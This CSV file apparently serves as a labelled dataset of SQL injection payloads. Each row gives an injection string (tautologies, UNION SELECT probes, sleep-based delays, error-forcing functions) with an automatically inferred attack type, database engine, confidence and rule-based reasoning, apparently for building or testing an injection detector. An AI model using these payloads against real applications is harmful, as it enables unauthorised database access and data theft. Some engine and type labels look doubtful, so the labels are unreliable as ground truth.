id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19344,1' ) where 4949 = 4949,boolean_blind,generic,0.85,Boolean tautology 'where 4949 = 4949' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19345,"1"" ) ) as sqow where 8752 = 8752",boolean_blind,generic,0.85,Boolean tautology 'where 8752 = 8752' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19346,"1 ) where 8008 = 8008 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,"Token match 'from all_users t1,all_users t2' (all_users t1,t2 cross-join), 'from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5' (5x cartesian join) → heavy_query (P4); db=oracle",1
19347,"1"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.95,"Token match 'extractvalue (' (extractvalue(), 'procedure analyse (' (procedure analyse()) → error_based (P4); db=mysql",2
19348,"1"" ) as frmp where 6073 = 6073",boolean_blind,generic,0.85,Boolean tautology 'where 6073 = 6073' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19349,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,0.95,"Token match 'extractvalue (' (extractvalue(), 'procedure analyse (' (procedure analyse()) → error_based (P4); db=mysql",2
19350,-2411 or ( 8459 = 8459 ) *4906# pxwg,boolean_blind,generic,0.85,Boolean tautology 'or ( 8459 = 8459' + injection break (comment tail) → boolean_blind (P3); db=generic,2
19351,"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,0.85,Token match 'ctxsys.' (ctxsys.drithsx.sn) → error_based (P4); db=oracle,3
19352,"1%"" union all select null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19353,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19354,select ( case when ( 3716 = 4021 ) then 3716 else 3716* ( select 3716 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.9,CASE WHEN + tautology 'when ( 3716 = 4021' — boolean_blind inferential (P3); db=mysql,3
19355,"-2111' union all select 1061,1061,1061--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19356,"1"" ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,postgresql,0.85,"Token match 'from domain.domains as t1,domain.' (domain.* cross-join (postgresql)) → heavy_query (P4); db=postgresql",1
19357,"-8060"" ) where 5290 = 5290 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,generic,0.85,Boolean tautology 'where 5290 = 5290' + injection break (comment tail) → boolean_blind (P3); db=generic,3
19358,"-5170' ) ) as ovbf where 4833 = 4833 union all select 4833,4833,4833,4833--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19359,1' where 5103 = 5103,boolean_blind,generic,0.85,Boolean tautology 'where 5103 = 5103' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19360,"-8771"" ) ) union all select 6302,6302,6302,6302,6302#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19361,"1, ( select ( case when ( 8640 = 8640 ) then ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 ) ,0 ) ,500000000 ) ,null ) ) ) else 8640/ ( select 0 from information_schema.system_users ) end ) from information_schema.system_users ) --",boolean_blind,mysql,0.9,CASE WHEN construct + ASCII() — inferential boolean_blind (P3); db=mysql,2
19362,"-1573"" ) union all select 3928,3928,3928,3928--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19363,1 ) rlike sleep ( 5 ) and ( 5724 = 5724,time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19364,1 ) where 7096 = 7096,boolean_blind,generic,0.75,Boolean equality 'where 7096 = 7096' tautology pattern — boolean_blind (P3); db=generic,2
19365,-3166'|| ( select 'mtan' from dual where 9420 = 9420 union all select 9420#,union_based,oracle,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=oracle,3
19366,1 ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 3069 = 3069,time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19367,1 where 4787 = 4787,boolean_blind,generic,0.75,Boolean equality 'where 4787 = 4787' tautology pattern — boolean_blind (P3); db=generic,2
19368,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",boolean_blind,mysql,0.9,"Token match 'elt ( 8190 = 8190' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19369,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19370,"1"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,mysql,0.85,Token match 'crypt_key (' (crypt_key()) → heavy_query (P4); db=mysql,2
